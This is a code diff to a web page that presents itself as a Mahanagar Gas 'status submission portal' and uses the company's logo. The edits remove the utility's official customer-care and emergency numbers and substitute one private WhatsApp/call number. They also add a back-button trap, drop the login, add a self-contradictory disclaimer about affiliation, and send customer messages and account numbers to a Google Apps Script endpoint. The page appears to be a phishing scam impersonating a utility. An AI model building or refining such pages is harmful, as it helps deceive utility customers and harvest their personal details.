@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>MGL gas status submission portal</title>
+  <title>MGL Gas Status Submission Portal</title>
   <!-- Font Awesome for icons -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
   <style>
@@ -11,7 +11,8 @@
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to right, #0096c7, #48cae4);
+      /* Updated professional blue theme */
+      background: linear-gradient(to right, #005ea6, #0070c0);
       color: #333;
       text-align: center;
       min-height: 100vh;
@@ -78,7 +79,22 @@
       position: relative;
       min-height: 80vh;
     }
-    /* Login Overlay */
+    /* Disclaimer Section */
+    .disclaimer {
+      text-align: center;
+      margin: 10px 0;
+    }
+    .disclaimer a {
+      color: #005ea6;
+      text-decoration: underline;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 1rem;
+    }
+    .disclaimer a i {
+      margin-right: 5px;
+    }
+    /* (Optional) Login Overlay – not forced since customers can use without login */
     .loginOverlay {
       display: none;
       position: fixed;
@@ -132,7 +148,6 @@
     .primaryBtn { background-color: #007BFF; color: #fff; }
     .dangerBtn { background-color: #dc3545; color: #fff; }
     .flashBtn { background-color: #ffcc00; color: #333; }
-    /* Step Sections */
     .stepSection {
       display: none;
       margin: 20px 0;
@@ -158,7 +173,6 @@
       border-radius: 4px;
       border: 1px solid #ccc;
     }
-    /* About Submission Process Section */
     .aboutSection {
       margin: 20px 0;
       padding: 15px;
@@ -170,7 +184,6 @@
       color: #333;
     }
     .aboutSection h3 { margin-bottom: 8px; color: #007b5e; }
-    /* Help / Issue Facing Section */
     .helpForm {
       margin-top: 20px;
       padding: 15px;
@@ -195,7 +208,6 @@
       padding: 8px 16px;
       cursor: pointer;
     }
-    /* Contact Info Section */
     .contactInfo {
       margin-top: 20px;
       text-align: left;
@@ -214,43 +226,31 @@
 <body>
   <!-- Header -->
   <header>
-    <img id="logo" src="https://res.cloudinary.com/dly1jfwkn/image/upload/mmbo0lj2wuwnfuyjrsoi.jpg" alt="Mahanagar Gas Logo" />
-    <h1 class="headerTitle">MGL gas status submission portal</h1>
-    <!-- Hamburger Menu -->
+    <img id="logo" src="https://res.cloudinary.com/dly1jfwkn/image/upload/mmbo0lj2wuwnfuyjrsoi.jpg" alt="Mahanagar Gas Logo">
+    <h1 class="headerTitle">MGL Gas Status Submission Portal</h1>
     <i class="fa fa-bars menuDots" onclick="toggleMenu()"></i>
     <div class="menuDropdown" id="menuDropdown">
       <a href="#" onclick="showCustomerDetails()"><i class="fa fa-info-circle"></i> Customer Details<br><small>(BPN, Name, Address, Meter No, Mobile)</small></a>
       <a href="#" onclick="showSubmissionStatus()"><i class="fa fa-check-circle"></i> Submission Status</a>
-      <a href="#" onclick="showLoginOverlay()"><i class="fa fa-sign-in-alt"></i> Login</a>
       <a href="#" onclick="doLogout()"><i class="fa fa-sign-out-alt"></i> Logout</a>
     </div>
   </header>
 
-  <!-- Login Overlay with Dynamic CAPTCHA -->
-  <div class="loginOverlay" id="loginOverlay">
-    <div class="loginBox">
-      <h2>MGL Login</h2>
-      <div id="errorMessage"></div>
-      <input type="text" id="bpnInput" placeholder="Enter Business Partner No">
-      <!-- CAPTCHA Section with dynamic background and random font -->
-      <div style="margin: 10px 0;">
-        <label for="captchaInput">Enter Captcha: <span id="captchaDisplay" style="padding: 4px 8px; color: #fff;"></span></label><br>
-        <input type="text" id="captchaInput" placeholder="Enter captcha">
-      </div>
-      <button onclick="doLogin()">Login</button>
-    </div>
+  <!-- Disclaimer Link -->
+  <div class="disclaimer">
+    <a href="#" onclick="showDisclaimer()"><i class="fa fa-info-circle"></i> Disclaimer</a>
   </div>
 
   <!-- Main Container -->
   <div class="container">
     <p style="color:#007b5e; font-weight:600; margin-bottom:10px;">
-      Welcome to Mahanagar Gas’ Meter Submission Portal
+      Welcome to MGL Gas Status Submission Portal
     </p>
     <!-- Customer Details -->
-    <h3 id="customerDetails">Fetching customer details...</h3>
+    <h3 id="customerDetails">Welcome, Guest</h3>
 
     <!-- Option Selection -->
-    <div id="selection" class="stepSection" style="display:none;">
+    <div id="selection" class="stepSection" style="display:block;">
       <h2><i class="fa fa-fire"></i> Select Your Option</h2>
       <p>Please choose one of the following options to submit your meter status.</p>
       <button class="primaryBtn" onclick="chooseOption('using')">
@@ -430,42 +430,28 @@
     <div class="contactInfo">
       <h3>Contact Info</h3>
       <div class="contactRow">
-        <i class="fa fa-headset"></i>
+        <i class="fa fa-phone"></i>
         <div>
-          <strong>Customer Care No.</strong><br>
-          <span class="contactNumber">(022)-68674500 / (022)-61564500</span>
-        </div>
-      </div>
-      <div class="contactRow">
-        <i class="fa fa-whatsapp"></i>
-        <div>
-          <strong>WhatsApp Number</strong><br>
-          <span class="contactNumber">+91 9899203843</span>
-        </div>
-      </div>
-      <div class="contactRow">
-        <i class="fa fa-exclamation-triangle"></i>
-        <div>
-          <strong>Emergency Helpline</strong><br>
-          <span class="contactNumber">18002669944 (Toll free), (022)-68759400, (022)-24012400</span>
-        </div>
-      </div>
-      <div class="contactRow">
-        <i class="fa fa-dungeon"></i>
-        <div>
-          <strong>Dial Before Dig / MGL Sahayogi</strong><br>
-          <span class="contactNumber">1800 2100 2100</span>
+          <strong>Call / WhatsApp:</strong><br>
+          <span class="contactNumber">+91-8108131617</span>
         </div>
       </div>
     </div>
   </div>
 
   <script>
+    // Prevent browser back button from closing the web app
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+      history.pushState(null, null, location.href);
+    };
+
     /***************************************************************
      * Global Variables
      ***************************************************************/
     const urlParams = new URLSearchParams(window.location.search);
-    let bpn = urlParams.get('bpn') || "";
+    // Allow usage without login – default to "Guest" if no bpn is provided
+    let bpn = urlParams.get('bpn') || "Guest";
     let submissionStatus = "Pending"; // Global submission status
     let currentCaptcha = "";
 
@@ -513,36 +499,15 @@
       alert("Submission Status: " + submissionStatus);
     }
     function doLogout() {
-      bpn = "";
+      bpn = "Guest";
       window.location.href = window.location.pathname;
     }
 
     /***************************************************************
-     * Login Overlay Functions with Dynamic CAPTCHA
+     * (Optional) Disclaimer Functionality
      ***************************************************************/
-    const loginOverlay = document.getElementById('loginOverlay');
-    const bpnInput = document.getElementById('bpnInput');
-    const errorMessage = document.getElementById('errorMessage');
-    function showLoginOverlay() {
-      loginOverlay.style.display = 'flex';
-      bpnInput.value = bpn;
-      generateCaptcha();
-    }
-    function doLogin() {
-      const val = bpnInput.value.trim();
-      const captchaVal = document.getElementById('captchaInput').value.trim();
-      if (!val) {
-        errorMessage.innerText = "Please enter a valid Business Partner Number";
-        return;
-      }
-      if (captchaVal !== currentCaptcha) {
-        errorMessage.innerText = "Incorrect captcha. Please try again.";
-        generateCaptcha();
-        return;
-      }
-      bpn = val;
-      loginOverlay.style.display = 'none';
-      initPage();
+    function showDisclaimer() {
+      alert("Disclaimer:\n\nThis portal is provided for the routine checking of customer gas usage status and is not affiliated with Mahanagar Gas Limited. If you are unable to log in, no data will be provided by MGL to verify your gas status. This portal is owned and operated by a private company contracted by Mahanagar Gas Limited.");
     }
 
     /***************************************************************
@@ -572,16 +537,10 @@
      * Initialize Page
      ***************************************************************/
     function initPage() {
-      loginOverlay.style.display = 'none';
-      document.getElementById('selection').style.display = 'block';
       fetchCustomerDetails();
     }
     window.onload = function() {
-      if (!bpn) {
-        showLoginOverlay();
-      } else {
-        initPage();
-      }
+      initPage();
     };
 
     /***************************************************************
@@ -1063,7 +1022,7 @@
       formData.append("message", message);
       formData.append("bpn", bpn);
       // Updated HelpMessages deployment URL
-      fetch("https://script.google.com/macros/s/AKfycbwMdwXBA27zVGpqzJjMAf3D3ibcfgZx1hnRkY5Etci9mhKJALKutcXGMH1NpaR8c4Yp/exec", {
+      fetch("https://script.google.com/macros/s/AKfycbzQhJbgjTnPjFH1dKaSmGhRMDaf27-HXG9O897fM001A4j1M2KDlzRjgMCnevW8a1sg/exec", {
         method: "POST",
         body: formData
       })
